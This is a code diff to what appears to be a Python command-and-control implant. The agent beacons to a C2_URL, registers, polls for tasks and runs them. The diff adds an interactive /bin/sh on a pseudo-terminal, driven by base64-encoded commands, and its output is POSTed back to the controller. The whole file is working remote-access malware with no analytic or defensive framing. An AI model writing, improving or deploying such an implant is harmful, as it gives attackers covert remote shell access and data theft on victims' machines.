@@ -1,3 +1,4 @@
+import base64
 import json
 import os
 import platform
@@ -102,83 +103,54 @@ def submit_result(agent_id, task_id, output, status="success"):
         pass
 
 
-persistent_shell = None
-persistent_master = None
-persistent_pid = None
+_pty_fd = None
 
 
-def _pid_alive(pid):
+def handle_shell():
+    global _pty_fd
     try:
-        os.kill(pid, 0)
-        return True
-    except OSError:
-        return False
-
-
-def get_persistent_shell():
-    global persistent_shell, persistent_master, persistent_pid
-    if persistent_shell is None or not _pid_alive(persistent_shell):
-        master_fd, slave_fd = pty.openpty()
-
-        winsize = struct.pack("HHHH", 80, 24, 0, 0)
-        fcntl.ioctl(master_fd, termios.TIOCSWINSZ, winsize)
-
-        pid = os.fork()
+        pid, fd = pty.fork()
         if pid == 0:
-            for fd in (0, 1, 2):
-                try:
-                    os.close(fd)
-                except OSError:
-                    pass
+            os.execve("/bin/sh", ["/bin/sh", "-i"], os.environ)
+        _pty_fd = fd
+        out = _read_pty(1)
+        return "SHELL:ready:" + base64.b64encode(out).decode()
+    except Exception as e:
+        return "SHELL:error:" + str(e)
+
+
+def exec_shell_cmd(b64cmd):
+    global _pty_fd
+    if _pty_fd is None:
+        return base64.b64encode(b"SHELL:not started").decode()
+    try:
+        cmd = base64.b64decode(b64cmd).decode(errors="replace")
+        if cmd.strip() == "exit":
             try:
-                os.setsid()
+                os.close(_pty_fd)
             except OSError:
                 pass
-            os.dup2(slave_fd, 0)
-            os.dup2(slave_fd, 1)
-            os.dup2(slave_fd, 2)
-            os.close(slave_fd)
-            os.close(master_fd)
-            os.execve("/bin/sh", ["/bin/sh", "-i"], os.environ)
-            os._exit(1)
-        else:
-            os.close(slave_fd)
-            persistent_master = master_fd
-            persistent_shell = pid
-            persistent_pid = pid
-            time.sleep(0.3)
-            _flush_pty()
-    return persistent_shell, persistent_master, persistent_pid
-
-
-def _flush_pty():
-    global persistent_master
-    try:
-        while True:
-            r, _, _ = select.select([persistent_master], [], [], 0.05)
-            if not r:
-                break
-            os.read(persistent_master, 65536)
-    except (OSError, ValueError):
-        pass
+            _pty_fd = None
+            return base64.b64encode(b"SHELL:exited").decode()
+        os.write(_pty_fd, cmd.encode() + b"\n")
+        out = _read_pty(0.5)
+        return base64.b64encode(out).decode()
+    except Exception as e:
+        return base64.b64encode(("SHELL:error:" + str(e)).encode()).decode()
 
 
 def _read_pty(timeout=0.5):
-    global persistent_master
-    try:
-        out = b""
-        deadline = time.time() + timeout
-        while time.time() < deadline:
-            r, _, _ = select.select([persistent_master], [], [], 0.05)
-            if r:
-                chunk = os.read(persistent_master, 8192)
-                if not chunk:
-                    break
-                out += chunk
-                deadline = time.time() + 0.3
-        return out
-    except OSError:
+    global _pty_fd
+    if _pty_fd is None:
         return b""
+    try:
+        r, _, _ = select.select([_pty_fd], [], [], timeout)
+        if r:
+            data = os.read(_pty_fd, 4096)
+            return data
+    except OSError:
+        _pty_fd = None
+    return b""
 
 
 def execute_shell(command):
@@ -199,18 +171,11 @@ def execute_shell(command):
 
 
 def execute_shell_interactive(command):
-    global persistent_master
-    _, master, _ = get_persistent_shell()
-    os.write(master, (command + "\n").encode())
-    out = _read_pty(2)
-    return out.decode(errors="replace")
-
-
-def pty_drain():
-    global persistent_master
-    if persistent_master is None:
-        return b""
-    return _read_pty(0.3)
+    result_b64 = exec_shell_cmd(base64.b64encode(command.encode()).decode())
+    try:
+        return base64.b64decode(result_b64).decode(errors="replace")
+    except Exception:
+        return result_b64
 
 
 def execute_upload(params):
@@ -395,7 +360,13 @@ def execute_task(task):
     params = task.get("params", {})
     task_id = task.get("task_id", "")
 
-    if command == "shell":
+    if command == "SHELL:":
+        output = handle_shell()
+        submit_result(agent_id, task_id, output, "success")
+    elif command.startswith("SHELL_CMD:"):
+        output = exec_shell_cmd(command[10:])
+        submit_result(agent_id, task_id, output, "success")
+    elif command == "shell":
         output = execute_shell(params.get("command", ""))
         submit_result(agent_id, task_id, output, "success")
     elif command == "shell_interactive":
@@ -418,12 +389,11 @@ def execute_task(task):
         submit_result(agent_id, task_id, output, "success")
 
 
-def submit_drain(data):
+def send_result(output):
     try:
-        b64 = __import__("base64").b64encode(data).decode()
         requests.post(
             f"{C2_URL}/result/{agent_id}",
-            json={"task_id": "drain", "output": "SHELL_DRAIN:" + b64, "status": "success"},
+            json={"output": output},
             timeout=5,
         )
     except Exception:
@@ -433,8 +403,6 @@ def submit_drain(data):
 if __name__ == "__main__":
     agent_id = get_agent_id()
     registered = False
-    drain_interval = 0
-
     while True:
         if not registered:
             aid = register()
@@ -446,12 +414,9 @@ if __name__ == "__main__":
         for task in tasks:
             execute_task(task)
 
-        if persistent_master is not None:
-            drain_interval += 1
-            if drain_interval >= 2:
-                out = pty_drain()
-                if out:
-                    submit_drain(out)
-                drain_interval = 0
+        if _pty_fd is not None:
+            out = _read_pty(0.3)
+            if out:
+                send_result("SHELL_DRAIN:" + base64.b64encode(out).decode())
 
         time.sleep(BEACON_INTERVAL)
